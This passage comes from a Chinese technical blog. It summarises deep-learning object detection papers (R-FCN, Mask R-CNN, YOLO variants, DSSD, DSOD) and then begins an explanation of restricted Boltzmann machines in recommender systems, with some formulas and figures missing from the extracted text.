(C+1)。C表示物体类别种数再加上1个背景类别，每个类别都有k x k 个score maps分别对应每个类别的不同位置。每个通道分别负责某一类的特定位置的特征提取工作。2.2 Position-sensitive RoI pooling位置敏感RoI池化操作了（Position-sensitive RoI pooling）如下图所示：该操作将每个RoIs分为k x k 个小块。之后提取其不同位置的小块相应特征图上的特征执行池化操作，下图展示了池化操作的计算方式。得到池化后的特征后，每个RoIs的特征都包含每个类别各个位置上的特征信息。对于每个单独类别来讲，将不同位置的特征信息相加即可得到特征图对于该类别的响应，后面即可对该特征进行相应的分类。2.3 position-sensitive regression在位置框回归阶段仿照分类的思路，将特征通道数组合为4 x k x k 的形式，其中每个小块的位置都对应了相应的通道对其进行位置回归的特征提取。最后将不同小块位置的四个回归值融合之后即可得到位置回归的响应，进行后续的位置回归工作。三. 网络训练3.1 position-sensitive score map高响应值区域在训练的过程中，当RoIs包涵物体属于某类别时，损失函数即会使得该RoIs不同区域块所对应的响应通道相应位置的特征响应尽可能的大，下图展示了这一过程，可以明显的看出不同位置的特征图都只对目标相应位置的区域有明显的响应，其特征提取能力是对位置敏感的。3.2 训练和测试过程使用如上的损失函数，对于任意一个RoI，计算它的Softmax损失，和当其不属于背景时的回归损失。因为每个RoI都被指定属于某一个GT box或者属于背景，即先让GT box选择与其IoU最大的那个RoI，再对剩余RoI选择与GT box的IoU&gt;0.5的进行匹配，而剩下的RoI全部为背景类别。当RoI有了label后loss就可以计算出来。这里唯一不同的就是为了减少计算量，作者将所有RoIs的loss值都计算出来后，对其进行排序，并只对最大的128个损失值对应的RoIs进行反向传播操作，其它的则忽略。并且训练策略也是采用的Faster R-CNN中的4-step alternating training进行训练。在测试的时候，为了减少RoIs的数量，作者在RPN提取阶段就将RPN提取的大约2W个proposals进行过滤：1.去除超过图像边界的proposals2.使用基于类别概率且阈值IoU=0.3的NMS过滤3.按照类别概率选择top-N个proposals在测试的时候，一般只剩下300个RoIs。并且在R-FCN的输出300个预测框之后，仍然要对其使用NMS去除冗余的预测框。算法效果：上图比较了Faster-R-CNN 和R-FCN的mAP值和监测速度，采用的基础网络为ResNet-101，测评显卡为Tesla K40。1.1.2 R-FCN-3000 at 30fps: Decoupling Detection and Classification论文链接：https://arxiv.org/pdf/1712.01802.pdf 开源代码：无 录用信息：无论文目标：与YOLO9000（本论述后文会具体介绍YOLO9000）类似，本文的目标也是面向实际应用场景的大规模类别物体的实时检测。YOLO9000将检测数据集和分类数据集合并训练检测模型，但r-fcn-3000仅采用具有辅助候选框信息的ImageNet数据集训练检测分类器。如果使用包含标注辅助信息（候选框）的大规模分类数据集，如ImageNet数据集，进行物体检测模型训练，然后将其应用于实际场景时，检测效果会是怎样呢？how would an object detector perform on “detection”datasets if it were trained on classification datasets with bounding-box supervision? 核心思想：r-fcn-3000是对r-fcn的改进。上文提到，r-fcn的ps卷积核是per class的，假设有C个物体类别，有KK个ps核，那么ps卷积层输出KKC个通道，导致检测的运算复杂度很高，尤其当要检测的目标物体类别数较大时，检测速度会很慢，难以满足实际应用需求。为解决以上速度问题，r-fcn-3000提出，将ps卷积核作用在超类上，每个超类包含多个物体类别，假设超类个数为SC，那么ps卷积层输出KKSC个通道。由于SC远远小于C，因此可大大降低运算复杂度。特别地，论文提出，当只使用一个超类时，检测效果依然不错。算法网络结构如下：上图可以看出，与r-fcn类似，r-fcn-3000也使用RPN网络生成候选框（上图中虚线回路）；相比r-fcn, r-fcn-3000的网络结构做了如下改进：1. r-fcn-3000包含超类（上图中上半部分）和具体类（上图中下半部分）两个卷积分支。2. 超类卷积分支用于检测超类物体，包含分类（超类检测）和回归（候选框位置改进）两个子分支；注意上图中没有画出用于候选框位置改进的bounding-box回归子分支；回归分支是类别无关的，即只确定是否是物体。3. 具体类卷积分支用于分类物体的具体类别概率，包含两个普通CNN卷积层。4. 最终的物体检测输出概率由超类卷积分支得到的超类类概率分别乘以具体类卷积分支输出的具体类别概率得到。引入超类和具体类两个卷积分支实现了‘物体检测’和‘物体分类’的解耦合。超类卷积分支使得网络可以检测出物体是否存在，由于使用了超类，而不是真实物体类别，大大降低了运算操作数。保证了检测速度；具体类分支不检测物体位置，只分类具体物体类别。 超类生成方式：对某个类别j的所有样本图像，提取ResNet-101最后一层2018维特征向量，对所有特征项向量求均值，作为该类别的特征表示。得到所有类别的特征表示进行K-means聚类，确定超类。算法效果：在imagenet数据集上，检测mAP值达到了34.9%。使用nvidia p6000 GPU，对于375x500图像，检测速度可以达到每秒30张。在这种速度下，r-fcn-3000号称它的检测准确率高于YOLO 18%。此外，论文实验表明，r-fcn-3000进行物体检测时具有较强的通用性，当使用足够多的类别进行训练时，对未知类别的物体检测时，仍能检测出该物体位置。如下图：在训练类别将近3000时，不使用目标物体进行训练达到的通用预测mAP为30.7%，只比使用目标物体进行训练达到的mAP值低0.3%。1.1.3 Mask R-CNN论文链接：https://arxiv.org/abs/1703.06870开源代码：https://github.com/TuSimple/mx-maskrcnn录用信息：CVPR2017论文目标1. 解决RoIPooling在Pooling过程中对RoI区域产生形变，且位置信息提取不精确的问题。2. 通过改进Faster R-CNN结构完成分割任务。核心思想：1. 使用RoIAlign代替RoIPooling，得到更好的定位效果。2. 在Faster R-CNN基础上加上mask分支，增加相应loss，完成像素级分割任务。一、概述Mask R-CNN是基于Faster R-CNN的基础上演进改良而来，不同于Faster R-CNN，Mask R-CNN可以精确到像素级输出，完成分割任务。此外他们的输出也有所不同。Faster R-CNN输出为种类标签和box坐标，而Mask R-CNN则会增加一个输出，即物体掩膜(object mask)。二、网络结构介绍Mask R-CNN结构如下图：Mask R-CNN采用和Faster R-CNN相同的两个阶段，具有相同的第一层(即RPN)，第二阶段，除了预测种类和bbox回归，并且并行的对每个RoI预测了对应的二值掩膜(binary mask)。三、Mask R-CNN详细改进1. RoIAlignFaster R-CNN采用的RoIPooling，这样的操作可能导致feature map在原图的对应位置与真实位置有所偏差。如下图：而通过引入RoIAlign很大程度上解决了仅通过 Pooling 直接采样带来的 Misalignment 对齐问题。 RoIPoolingRoIAlignRoIPooling会对区域进行拉伸,导致区域形变。RoIAlign可以避免形变问题。具体方式是先通过双线性插值到14 x 14，其次进行双线性插值得到蓝点的值，最后再通过max Pooling或average pool到7 x 7。2.多任务损失函数Mask R-CNN的损失函数可表示为：其中 和 与Faster R-CNN中的相似，所以我们具体看 损失函数。掩膜分支针对每个RoI产生一个K x M xM的输出,即K个M x M的二值的掩膜输出。其中K为分类物体的类别数目。依据预测类别输出，只输出该类对应的二值掩膜，掩膜分支的损失计算如下示意图：1. mask branch 预测K个种类的M x M二值掩膜输出。2. 依据种类预测分支(Faster R-CNN部分)预测结果：当前RoI的物体种类为i。3.RoI的平均二值交叉损失熵（对每个像素点应用Sigmoid函数）即为损失 。此外作者发现使用Sigmoid优于Softmax ，Sigmoid可以避免类间竞争。算法效果：体现了在COCO数据集上的表现效果。1.2 One stage提到one stage算法就必须提到OverFeat，OverFeat网络将分类、定位、检测功能融合在一个网络之中。随后的YOLO和SSD网络，都是很经典的one stage检测算法。YOLO论文作者对原始YOLO网络进行了改进，提出了YOLO9000和YOLOv3。YOLO9000号称可以做到更好，更快，更强。其创新点还包括用小规模（指类别）检测标注数据集 + 大规模分类标注数据集训练通用物体检测模型。YOLOv3是作者的一个technical report，主要的工作展示作者在YOLO9000上的改进。另外本综述还将介绍新论文Object detection at 200 Frames Per Second，这篇论文在YOLO的基础上进行创新，能在不牺牲太多准确率的情况下达到200FPS（使用GTX1080）。SSD算法是一种直接预测bounding box的坐标和类别的object detection算法，利用不同分辨率卷积层的feature map，可以针对不同scale的物体进行检测。本篇综述中主要介绍DSSD（原始作者的改进版本）和DSOD这两篇论文。1.2.1 YOLO9000: better, faster, stronger论文链接：https://arxiv.org/pdf/1612.08242.pdf 开源代码：https://github.com/pjreddie/darknethttps://github.com/zhreshold/mxnet-YOLO MXNet实现录用信息：CVPR2017论文目标：论文目标是要解决包含大规模物体类别的实际应用场景中的实时目标检测。实际应用场景中，目标检测应满足两个条件：1. 检测速度满足实际场景需求 2. 覆盖物体类别满足实际场景需求。实际场景包含很多类别的物体，而这些类别物体的标注数据很难拿到，本论文提出使用小规模（指类别）检测标注数据集 + 大规模分类标注数据集训练通用物体检测模型。核心思想：YOLO9000是在YOLO基础上的改进，相比YOLO，YOLO9000号称可以做到更好，更快，更强。下面从这三个方面介绍YOLO9000如何做到这三点。YOLO相关的论文解读可以参考：https://zhuanlan.zhihu.com/p/25236464一、更好准确率提升。相比R-CNN系列，YOLOv1的召回率和物体位置检测率较低，YOLO9000做了如下七点改进对其进行提升。1.加入BN层。在所有的卷积层后加入BN操作，去掉所有dropout层。2.使用高分辨率训练得到的分类模型pretrain检测网络。YOLOv1使用224x224训练得到的分类模型pretrain，而YOLO9000直接使用448x448训练得到的分类模型pretrain检测网络。3.使用卷积层预测anchor box位置。YOLOv1基于输入图像的物理空间划分成7x7的网格空间，每个网格最多对应两个候选预测框，因此每张图像最多有98个bounding box，最后接入全连接层预测物体框位置。而YOLO9000移除全连接层，使用anchor box预测候选框位置，大大增加了每张图片的候选框个数。这个改进将召回率由81%提高到88%，mAP由69.5%稍微降低到69.2%。同时，由于去掉了全连接层，YOLO9000可以支持检测时不同分辨率的图像输入。4.kmeans聚类确定候选框形状。使用k-means对训练数据集中的物体框的分辨率和比例进行聚类，确定anchor box的形状。为避免物体大小引起的统计误差，YOLO9000使用IoU而不是欧氏距离来作为距离度量方式。5.预测‘候选框相对于图像的内部偏移’。以往RPN网络，通过回归候选框相对于当前anchor box的偏移来定位候选框的位置，由于偏移相对于anchor box外部，所以取值范围是不受限的，导致训练的时候难以收敛。因此YOLO9000采用与YOLO类似的方式，预测候选框相对于图像左上角的位置偏移，并将偏移量归一化到0-1区间，解决了训练难收敛问题。6.使用更精细的特征。YOLOv1提取13x13的特征层进行后续物体检测，对于小物体的检测效果并不友好。为解决这个问题，YOLO9000将前一层26x26的特征与13x13层的特征进行通道concatenation。如26x26x512的feature map被拆分成13x13x2048，然后同后面的13x13特征层进行concatenation。mAP提升1%。7.多尺度图像训练。YOLO9000采用不同分辨率的图像进行模型迭代训练，增强模型对多尺度图像的预测鲁棒性。二、更快YOLOv1的basenet基于GoogleNet改进得到，计算复杂度大概是VGG16的1/4，但在imagenet上224x224图像的top-5分类准确率比vgg16低2%。YOLO9000提出一个全新的basenet，号称darknet-19，包含19个卷积层和5个max pooling层，详细网络结构见论文，计算复杂度比YOLOv1进一步减少了34%，imagenet上top-5准确率提升了3.2%。三、更强更强是指，在满足实时性需求的前提下，能检测出的物体类别数更多，范围更大。YOLO9000提出使用词树’wordtree’，将分类数据集和检测数据集合并，进行模型训练。反向传播时，检测样本的训练loss用于计算和更新整个网络的模型参数；而分类样本的训练loss仅用于更新与分类相关的网络层模型参数。这样以来，检测数据集训练网络学到如何检测出物体（是否是物体，位置），而分类数据集使得网络识别出物体类别。算法效果：下图给出了YOLOv2和对比算法的准确率和运行时间的综合性能结果。可以看出YOLOv2在保证准确率的同时，可以达到超过30fps的图像检测速度。相比SSD512和Faster R-CNN（使用ResNet），YOLOv2在准确率和运行性能上都更胜一筹（图中左边第一个蓝圈）。1.2.2 YOLOv3: an incremental improvement论文链接：https://arxiv.org/abs/1804.02767开源代码：https://github.com/pjreddie/darknet录用信息：无。原文是4页technical report，2018年4月在arxiv放出。论文目标：保证准确率同时，更快。核心思想：YOLOv3对YOLO9000进行了改进，v3采用的模型比YOLO9000更大，进一步提高检测准确率，但速度比YOLO9000稍慢。相比其他检测算法，RetinaNet，SSD，DSSD等算法，YOLOv3的综合性能（准确率&amp;速度）仍然很是最好的。但总的来说，文章的改进主要还是修修补补，换换网络，没有特别的突出创新点。具体改进如下：1. 候选框预测时增加‘物体性’的预测，即增加对候选框 是否包含物体 的判断。这条改进借鉴Faster R-CNN的做法。区别在于，Faster R-CNN一个ground truth框可能对应多个检测候选框，而YOLO9000每个ground truth object最多对应到一个检测候选框。那么这会使得很多候选框对应不到ground truth box，这种候选框在训练时不会计算坐标或分类误差，而只会加入对‘物体性’的检测误差。2. 多标签分类。每个候选框可以预测多个分类，使用逻辑归二分类器进行分类。3. 多尺度预测。借鉴FPN思想，在3个尺度上进行预测，每个尺度对应3个候选框，每个候选框输出’位置偏移‘，是否包含物体以及分类结果。YOLOv3对小物体的检测效果比YOLO9000有提升，但是对中大物体的检测准确率却有降低。文章没给出具体原因。4. 提出新的basenet。YOLOv3采用一个53层卷积的网络结构，号称darknet-53，网络设计只采用3x3，1x1的卷积层，借鉴了ResNet的残差网络思想。该basenet在ImageNet上对256x256的Top-5分类准确率为93.5，与ResNet-152相同，Top-1准确率为77.2%，只比ResNet-152低0.4%。与此同时，darknet-53的计算复杂度仅为ResNet-152的75%, 实际检测速度（FPS）是ResNet-152的2倍。5. 除以上改进外，YOLOv3还做了一些其他尝试，但效果都不理想。具体见论文，此处不列出。算法效果：对320x320的输入图像，YOLOv3在保证检测准确率与SSD一致（mAP=28.2）的前提下，处理每张图像的时间为22ms，比SSD快3倍。值得注意的是，论文提出的darknet-53，是一个比ResNet152综合性能更好的分类网络。1.2.3 Object detection at 200 Frames Per Second论文链接：https://arxiv.org/abs/1805.06361开源代码：无录用信息：无论文目标：为了解决检测算法计算复杂度过高、内存占用过大的问题，本文提出了一种快而有效的方法，能够在保持高检测率的同时，达到每秒200帧的检测速度。核心思想：为了实现又快又强的检测目标，本文从三个方面提出了创新：网络结构、损失函数以及训练数据。在网络结构中，作者选择了一种深而窄的网络结构，并探讨了不同特征融合方式带来的影响。在损失函数设计中，作者提出了蒸馏损失函数以及FM-NMS方法以适应one-stage算法的改进。最后，作者在训练时同时使用了已标注数据和未标注数据。下面具体介绍下本文在这三方面的创新工作。一、网络结构一般来说，网络越深越宽，效果也会越好，但同时计算量和参数量也会随之增加。为了平衡算法的效果与速度，作者采用了一个深而窄的网络结构。示意图如下:说明一下，本文的baseline算法是Tiny-Yolo（Yolo 9000的加速版）。为了实现更窄，作者将卷积的通道数做了缩减，从Yolo算法的1024缩减为了512；为了实现更宽，作者在最后添加了3个11的卷积层。为了加深理解，建议读者结合Yolo的网络结构图，对比查看。从上图中，我们还可以看出，作者采用了特征融合的方式，将前几层提取的特征融合到了后面层的特征图中。在融合的过程中，作者并没有采取对大尺寸特征图做max pooling然后与小尺寸特征图做融合的方式，而是采用了stacking方法，即先将大尺寸特征图进行resize然后再和小尺寸特征图做融合。具体到上图中，对10410464的特征图用卷积核数量为4，大小为11的卷积层进行压缩，得到1041044的特征图，然后做resize得到1313256的输出。二、损失函数蒸馏算法是模型压缩领域的一个分支。简单来说，蒸馏算法是用一个复杂网络（teacher network）学到的东西去辅助训练一个简单网络（student network）。但直接将蒸馏算法应用于one stage的Yolo算法还存在着一些困难。困难1：对于two stage算法，在第一阶段就会去除很多背景RoI，送入检测网络的RoI相对较少，并且大部分包含object；而one stage 算法，输出中包含大量背景RoI。如果直接对输出进行学习，会导致网络过于关注背景，而忽视了前景。鉴于此，本文作者提出objectness scaled distillation，主要考虑了teacher network中输出的objectness对损失函数的影响。作者认为只有objectness比较大的才应该对损失函数有贡献。为了更好地理解作者的思路，我们先回顾一下Yolo算法的损失函数，如下所示：其中 , , 分别代表student network预测的objectness、class probability以及bbox坐标， , , 则代表了真实值。作者提出的蒸馏损失函数如下：困难2：对于检测算法来说，如果不做NMS，直接将teacher network的预测RoI输出给student network，会因为某些box有很多的相关预测RoI而导致这些box容易过拟合。鉴于此，本文作者提出FM-NMS。取33区域内的相邻grid cell，对这9个grid cell中预测相同类别的bbox按照objectness 进行排序，只选择得分最高的那个bbox传给student network。2个grid cell做FM-NMS的示意图如下：三、训练数据鉴于作者使用了蒸馏算法，在训练时，可以非常方便地使用已标注数据和未标注数据。如果有标注数据，就使用完整的蒸馏损失函数。如果没有标注数据，就只使用蒸馏损失函数的distillation loss部分。 算法效果：1.2.4 DSSD: Deconvolutional Single Shot Detector论文链接：https://arxiv.org/pdf/1701.06659.pdf开源代码：https://github.com/MTCloudVision/mxnet-DSSD 综述笔者实现版本录用信息：未被会议收录论文目标：大小物体通吃。使用Top-Down网络结构，解决小物体检测的问题。DSSD论文的详细解读可以参见https://zhuanlan.zhihu.com/p/33036037。DSSD与FPN类似，都是基于Top-Down结构解决小物体检测，不同的是，如FPN的网络结构只是针对ResNet做了优化，文章中也没有提及过更换其他的基础网络的实验结果，普适度不够。DSSD作者提出一种通用的Top-Down的融合方法，使用vgg和ResNet网络将高层的语义信息融入到低层网络的特征信息中，丰富预测回归位置框和分类任务输入的多尺度特征图，以此来提高检测精度。笔者认为，虽然Top-Down结构也许有效，但毕竟DSSD比FPN放出时间更晚一些，且在网络结构上这并没有太大创新，也许这就是本文未被会议收录的原因之一。核心思想：DSSD是基于SSD的改进，引入了Top-Down结构。下文分别从这两方面出发，介绍DSSD思想。一、DSSD之于SSDDSSD相对于 SSD算法的改进点，总结如下：1.提出基于Top-Down的网络结构，用反卷积代替传统的双线性插值上采样。2.在预测阶段引入残差单元，优化候选框回归和分类任务输入的特征图。3. 采用两阶段训练方法。DSSD的网络结构与SSD对比如下图所示，以输入图像尺寸为为例，图中的上半部分为SSD-ResNet101的网络结构，conv3_x层和conv5_x层为原来的ResNet101中的卷积层，后面的五层是SSD扩展卷积层，原来的SSD算法是将这七层的特征图直接输入到预测阶段做框的回归任务和分类任务。DSSD是将这七层特征图拿出六层（去掉尺寸为的特征图）输入到反卷积模型里，输出修正的特征图金字塔，形成一个由特征图组成的沙漏结构。最后经预测模块输入给框回归任务和分类任务做预测。DSSD中的D，即反卷积模型，指的是DSSD中高层特征和低层特征的融合模块，其基本结构如下图所示：二、DSSD之于FPN和TDM同样是采用Top-Down方式，DSSD与FPN 和TDM（这两篇论文将在本论述后文中详细介绍）的网络结构区别如下图。可以看出，TDM使用的是concat操作，让浅层和深层的特征图叠在一起。DSSD使用的是Eltw Product（也叫broadcast mul）操作，将浅层和深层的特征图在对应的信道上做乘法运算。FPN使用的是Eltw Sum（也叫broadcast add）操作，将浅层和深层的特征图在对应的信道上做加法运算。算法效果：DSSD 当输入为513x513的时候在VOC2007数据集赏达到了80.0%mAP。更详细的实验复现和结果对比见https://zhuanlan.zhihu.com/p/330360371.2.5 DSOD : learning deeply supervised object detectors from scratch论文链接：https://arxiv.org/pdf/1708.01241.pdf开源代码：https://github.com/szq0214/DSOD录用信息：ICCV2017论文目标：从零开始训练检测网络。DSOD旨在解决以下两个问题：1. 是否可以从零开始训练检测模型？2. 如果可以从零训练，什么样的设计会让网络结果更好？DSOD是第一个不使用图像分类预训练模型进行物体检测训练初始化的检测算法。此外，DSOD网络参数只有SSD的1/2，Faster R-CNN的1/10。核心思想：一、从零开始训练检测任务现有的物体检测算法如Faster R-CNN、YOLO、SSD需要使用在大规模分类数据集上训练得到的分类模型进行backbone网络初始化。比如使用ImageNet分类模型。这样做的优势在于：1.可以使用现有的模型，训练较快；2. 由于分类任务已经在百万级的图像上进行过训练，所以再用做检测需要的图片数量会相对较少。但其缺点也很明显：1.很多检测网络都是分类网络改的。图像分类网络一般都较大，检测任务可能不需要这样的网络。2.分类和检测的策略不同，可能其最佳收敛区域也不一样。3. 分类任务一般都是RGB图像训练的，但检测有可能会使用深度图像、医疗图像等其他类型的图像。导致图像空间不匹配。为解决以上问题，DSOD提出从零开始训练检测模型。二、网络结构DSOD网络由backbone sub-network和front-end sub-network构成，Backbone的作用在于提取特征信息，Front-end网络是检测模块，通过对多层信息的融合用于物体检测。基础网络Backbone sub-network部分，是一个DenseNets的变种,由一个stem block, 四个dense blocks, 两个 transition layers ,两个transition w/o pooling layers构成,用来提取特征。如下图所示：Stem block中作者没有使用DenseNet的77卷积，而是使用了两个33的卷积（这点和Inception-V3的改进很像）。作者指出这种设计可以减少从原始图像的信息损失，对检测任务更有利。其他的模块和Densenet很类似。作者使用了详细的实验证明了基础网络的设计部分的规则，如Densenet的过渡层transition layer通道数不减少、Bottleneck结构的通道更多、使用stem block而非77卷积对最终的识别率都是有提升的。经过基础特征提取后，检测的网络Front-end sub-network有两种实现方式：Plain Connection和Dense Connection。其中Plain Connection 就是SSD的特征融合方法。注意虚框中的是Bottlenet结构，即使用11的卷积先降维然后再接33的卷积。笔者认为Dense Connection结构就是DSOD的主要创新点，这部分也很巧妙的采用了densenet的思想，一半的Feature map由前一个scale学到，剩下的一半是直接down-sampling的高层特征。以第一个链接结构为例，该结构的输入一半为上一层的降采样的Feature Map，其中通道的改变由11的卷积完成。另一半为这个尺度学习到的feature。经过Concat后的输出是三个部分，1. 经过11卷积和33卷积作为下一层的输入。2. 直接降采样并修改通道作为下一层的输入。3.输入这一层的feature到最后的检测任务。算法效果：DSOD的检测速度(17.4fps)比SSD、YOLO2略差，但在模型准确率和模型大小方面却更胜一筹，最小的网络只有5.9M，同时mAP也能达73.6%。作者在实验部分还使用了pre-trained model 初始化DSOD，结果反而没有从零开始训练效果好,未来可能去探究一下。未完待续基于深度学习的目标检测算法综述（二）基于深度学习的目标检测算法综述（三）","tags":[],"categories":[{"name":"剪贴板-Clipboard","slug":"剪贴板-Clipboard","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/"},{"name":"深度学习-Deep Learning","slug":"剪贴板-Clipboard/深度学习-Deep-Learning","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/深度学习-Deep-Learning/"}]},{"title":"基于深度学习的推荐系统之受限玻尔兹曼机","date":"2018-07-20T04:53:27.000Z","path":"wiki/剪贴板-Clipboard/深度学习-Deep Learning/于深度学习的推荐系统之受限玻尔兹曼机/","text":"深度学习相关技术近年来在工程界可谓是风生水起，在自然语言处理、图像和视频识别等领域得到极其广泛的应用，并且在效果上更是碾压传统的机器学习。一方面相对传统的机器学习，深度学习使用更多的数据可以进行更好的扩展，并且具有非常优异的自动提取抽象特征的能力。另外得益于GPU、SSD存储、大容量RAM以及大数据分布式计算平台等的快速发展，海量数据的处理能力大幅度提升。同时，“千人千面”的个性化推荐系统已经融入到我们的日常生活的方方面面，并且给企业带来了巨大的收益。智能推荐系统本质上是对原始的用户行为数据进行深入地分析和挖掘，得到用户的兴趣偏好，进行精准推荐。所以，将深度学习和推荐系统相结合也成为了工业界的研究热点，Google、Facebook、Netflix等公司很早就开始研究基于深度学习的推荐系统，并且取得了显著的效果提升。达观数据目前服务的公司有几百家，所提供的个性化推荐服务，不仅给企业带来了巨大的经济收益，同时大大提升了用户的粘性和活跃度，为企业的长远发展提供持续且高质量的技术支撑。当然这背后离不开达观数据多年来在个性化推荐算法上的持续打磨和对技术的精益求精，离不开在推荐效果优化上积累的丰富宝贵经验。本文选取了达观推荐系统众多推荐算法的其中之一：受限玻尔兹曼机（Restricted Boltzmann Machine，RBM），进行详细介绍。主要包括三部分：RBM介绍、RBM的数学原理、RBM在推荐系统中的应用。一、RBM介绍1、RBM和Netflix提到基于RBM的推荐系统，不得不提Netflix竞赛。2006年，Netflix公司为了提升推荐效果，悬赏百万美元组织了一场竞赛，让大家穷尽所能以使其推荐算法的效果能够提升10%以上。在竞赛的后半程，RBM异军突起。当时以SVD++为核心的各种模型几乎已经陷入了僵局，很多人在此基础上加了pLSA、LDA、神经元网络算法、马尔可夫链、决策树等等，但效果提升并不明显，各个参赛队伍基本上进入到了比拼trick与融合模型数据的体力活阶段了。但是，RBM的出现，把整个竞赛推进到了一个新的台阶。最终在2009年，“鸡尾酒”团队将上百个模型进行融合以10.05%的结果获得了此次竞赛的终极大奖。但是Netflix后来的线上系统并没有采用如此复杂的全套算法，而是仅仅应用了最核心的两个算法，其中就有受限玻尔兹曼机，另外一个就是耳熟能详的奇异值分解。2、RBM的层次结构RBM是一种可用随机神经网络来解释的概率图模型，主要用于协同过滤、降维、分类、回归、特征学习和主题建模。RBM包括两层，第一个层称为可见层，第二个层称为隐藏层。图 1 RBM两层结构如图1所示，每个圆圈称为节点，代表一个与神经元相似的单元，而运算就在这些节点中进行。每一个神经元是一个二值单元，也就是每一个神经元的取值只能等于0或1。节点之间的连接具有如下特点：层内无连接，层间全连接。RBM和BM的不同之处就在于：BM允许层内节点连接，而RBM不允许。这就是受限玻尔兹曼机中受限二字的本意。每一个节点对输入数据进行处理，同时随机地决定是否继续传输输入数据，这里的“随机”是指改变输入数据的系数是随机初始化的。每个可见层的节点表示有待学习数据集合中一个物品的一个低层次特征。图 2 输入数据通过节点的过程接下来看一下单个输入x是如何通过这个两层网络的，如图2所示。在隐藏层的节点中，x和一个权重w相乘，再和所谓的偏差b相加。这两步的结果输入到一个激活函数中，进而得到节点的输出，也就是对于给定输入x，最终通过节点后的信号强度。如果用公式表示的话，即：sigmoid函数是神经网络中常用的激活函数之一，其定义为：接下来看看多项输入节点是如何整合到隐藏节点中的，如图4所示。每个输入x分别与各自的权重w相乘，再将结果求和后与偏差b想加，得到结果后输入到激活函数中，最后得到节点的输出值a。图 4 多个输入通过一个隐藏节点的过程由于可见层的所有节点的输入都会被传送到隐藏层中的每个节点，所以RBM可以被定义成一种对称二分图。如图5所示，当多个输入通过多个隐藏节点时，在隐藏层的每个节点中，都会有 x和权重w相乘，有4个输入，而每个输入x会有三个权重，最终就有12个权重，从而可以形成一个行数等于输入节点数、列数等于输出节点数的权重矩阵。隐藏层的每个节点接收4个可见层的输入与各自权重相乘后的输入值，乘积之和与偏差值b相加，再经过激活运算后得到隐藏层每个节点的输出a。图 5 多个输入通过多个隐藏节点的过程再进一步，如果是想构建一个二层的深度神经网络，如6所示，将第一隐藏层的输出作为第二隐藏层的输入，然后再通过不定数量的隐藏层，最终就可以到达分类层。（达观数据 于敬）图 6 多隐藏层的处理过程3、RBM的重构这里介绍下RBM在无监督情况下如何重构数据的，其实就是在可见层和第一隐藏层之间多次进行正向和反向传递，但并不涉及更深的网络结构。在重构阶段，第一隐藏层的激活值作为反向传递的输入。这些输入值和相应的权重相乘，然后对这些乘积求和后再与偏差相加，得到的结果就是重构值，也就是原始输入x的近似值。图 7 RBM重构过程由于RBM的初始权重是随机初始化的，所以重构值与原始输入之间的差别往往很大。r值与输入值之差定义为重构误差，经由反向传递来不断修正RBM的权重，经过不断迭代，可以使得重构误差达到最小。RBM在正向传递过程中根据输入值来计算节点的激活值，也就是对输入x进行加权后得到输出为a的概率p(a|x;w)。 而在反向传递时，激活值则变成输入，输出值变成了原始数据的重构值，也就是RBM在估计激活值为a时而输入值为x的概率p(x|a;w)，激活值的权重w和正向传递中的一样。最终两个过程相结合，得到输入 为x 和激活值为 a 的联合概率分布p(x, a)。重构不同于平时所说的回归、分类。重构是在预测原始输入数据的概率分布，同时预测许多不同点的值，这就是生成学习。RBM用KL（Kullback Leibler）散度来衡量预测的概率分布与基准分布之间的距离。KL散度衡量的是两条曲线下方不重叠区域的面积，RBM的优化算法就是要最小化这个面积，从而使得权重在与第一隐藏层的激活值相乘后，可以得到与原始输入尽可能近似的结果。如图7所示，左半边是一组原始输入的概率分布曲线p，另外一个是重构值的概率分布曲线q，右半边的图则显示了两条曲线之间的差异。图 8 RBM重构过程中误差表示在整个重构过程中，RBM会根据重构误差反复的迭代计算，以尽可能准确地学习出原始值，最终看上去两条概率分布曲线会尽可能地逼近，如图8所示。图 9 RBM概率密度曲线的逼近利用RBM的堆叠可以构造出深层的神经网络模型——深度置信网络(Deep Belief Net, DBN)，感兴趣的话可以查阅相关资料深入了解。在处理无监督学习问题时，使用一定的数据集合来训练网络，设置下可见层节点的值匹配下数据集合中的值。然后使用训练好的网络，对未知数据进行计算就可以进行分类。二、RBM的数学原理在RBM中，有如下性质：当给定可见层节点的状态时，隐藏层各节点之间是否激活是条件独立的；反之当给定隐藏层节点的状态时，可见层各节点之间是否激活也是条件成立的。图 10 RBM的网络结构图10是一个RBM的网络结构示意图，其中： : 可见层的状态向量， 表示可见层中第 个神经元的状态: 可见层的状态向量， 表示隐藏层中第 个神经元的状态 : 可见层的偏置向量， 表示可见层中第 个神经元的偏置 : 隐藏层的偏置向量， 表示隐藏层中第 个神经元的偏置 : 隐藏层和可见层之间的权重矩阵， 表示隐藏层中第个 神经元与可见层中第 个神经元之间的连接权重 对于RBM，其参数主要是可见层和隐藏层之间的权重、可见层的偏置和隐藏层的偏置，记为 ，可将其看作是W、a、b中所有分量拼接起来的到的长向量。RBM是一个基于能量的模型，对于给定的状态(v, h)，可以定义能量函数进而可以的到(v, h)的联合概率分布其中为归一化因子于是，可以定义边缘概率分布结合联合概率分布、边缘概率分布和sigmoid函数，可以得到：在给定可见层状态时，隐藏层上某个神经元被激活的概率给定隐藏层状态时，可见层上某个神经元被激活的概率给定训练样本后，训练RBM也就是调整参数 ，使得RBM表示的概率分布尽可能与训练数据保持一致。给定训练集： 是训练样本的数量，则训练RBM的目标就是最大化似然函数：进一步取log函数：使用梯度上升法进行上述最优化问题的求解，梯度上升法的形式是： 为学习率，最终可以得到：Hinton给出了高效寻来呢RBM的算法——对比散度（Contrastive Divergence，简称CD）算法。对 ，取初始值：，然后执行k步Gibbs抽样，其中第t步先后执行：最后，关于RBM的评估方法，由于本身算法的限制，一般采用近似方法进行评估，重构误差就是其中之一。重构误差以训练样本作为初始状态，经过RBM的分布进行一次Gibbs转移后与原数据的差异量。重构误差在一定程度上反映了RBM对训练样本的似然度，虽然不完全可靠，但计算简单，在实践中非常有用。（达观数据 